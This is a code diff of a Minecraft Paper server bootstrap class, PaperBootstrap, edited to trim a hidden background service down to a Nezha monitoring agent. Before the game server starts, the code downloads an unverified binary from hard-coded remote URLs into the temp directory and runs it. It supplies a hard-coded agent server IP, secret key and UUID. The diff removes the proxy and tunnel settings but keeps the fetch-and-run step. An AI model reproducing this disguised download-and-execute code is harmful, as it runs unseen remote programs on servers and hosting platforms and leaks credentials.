@@ -19,12 +19,10 @@ public final class PaperBootstrap {
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
     private static Process sbxProcess;
-    
-    // 包含所有需要的环境变量
+
+    // 仅保留哪吒探针需要的环境变量
     private static final String[] ALL_ENV_VARS = {
-        "UUID", "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY", 
-        "HY2_PORT", "REALITY_PORT", "DISABLE_ARGO",
-        "ARGO_DOMAIN", "ARGO_AUTH", "ARGO_PORT", "CFIP", "CFPORT"
+        "UUID", "NEZHA_SERVER", "NEZHA_PORT", "NEZHA_KEY"
     };
 
     private PaperBootstrap() {
@@ -35,61 +33,46 @@ public final class PaperBootstrap {
             System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please switch the version in startup menu!" + ANSI_RESET);
             System.exit(1);
         }
-        
+
         try {
             runSbxBinary();
-            
+
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
             }));
 
-            System.out.println(ANSI_GREEN + "[System] Background Sing-box, Nezha & Fixed Argo Tunnel started successfully." + ANSI_RESET);
+            // 修改了提示信息，只提示哪吒启动
+            System.out.println(ANSI_GREEN + "[System] Background Nezha Agent started successfully." + ANSI_RESET);
 
             SharedConstants.tryDetectVersion();
             getStartupVersionMessages().forEach(LOGGER::info);
             Main.main(options);
-            
+
         } catch (Exception e) {
             System.err.println(ANSI_RED + "Error initializing background services: " + e.getMessage() + ANSI_RESET);
         }
     }
-    
+
     private static void runSbxBinary() throws Exception {
         Map<String, String> envVars = new HashMap<>();
         loadEnvVars(envVars);
-        
+
         ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
         pb.environment().putAll(envVars);
-        
-        // 依然保持将节点信息输出到日志文件，方便你查看具体的 ws 路径
+
+        // 去掉了 nodes_info.txt 的节点信息输出，避免在面板生成多余文件
         pb.redirectErrorStream(true);
-        File logFile = new File("nodes_info.txt");
-        pb.redirectOutput(logFile);
-        
+
         sbxProcess = pb.start();
     }
-    
+
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        // 你的 UUID
+        // 保留你的 UUID 和哪吒配置
         envVars.put("UUID", "66f3b0ac-e9c1-44c6-a434-177ef3deb3ed");
         envVars.put("NEZHA_SERVER", "149.56.18.147:11111");
         envVars.put("NEZHA_KEY", "ubpmaEb3yFt2VBc4iI9yW0QW0avBtjWi");
-        
-        // 保留之前的直连节点（前提是面板端口没变）
-        envVars.put("HY2_PORT", "25565");      
-        envVars.put("REALITY_PORT", "25575");  
-        
-        // --- 核心：固定 Argo 隧道配置 ---
-        envVars.put("DISABLE_ARGO", "false"); 
-        envVars.put("ARGO_DOMAIN", "");
-        envVars.put("ARGO_AUTH", "");
-        envVars.put("ARGO_PORT", "");
-        
-        // 优选 IP 配置（客户端导入节点后，可将地址替换为优选IP）
-        envVars.put("CFIP", "cdns.doon.eu.org");
-        envVars.put("CFPORT", "443");
-        
+
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
             if (value != null && !value.trim().isEmpty()) {
@@ -97,11 +80,11 @@ public final class PaperBootstrap {
             }
         }
     }
-    
+
     private static Path getBinaryPath() throws IOException {
         String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
-        
+
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
             url = "https://amd64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
@@ -111,7 +94,7 @@ public final class PaperBootstrap {
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
-        
+
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
         if (!Files.exists(path)) {
             try (InputStream in = new URL(url).openStream()) {
@@ -123,7 +106,7 @@ public final class PaperBootstrap {
         }
         return path;
     }
-    
+
     private static void stopServices() {
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
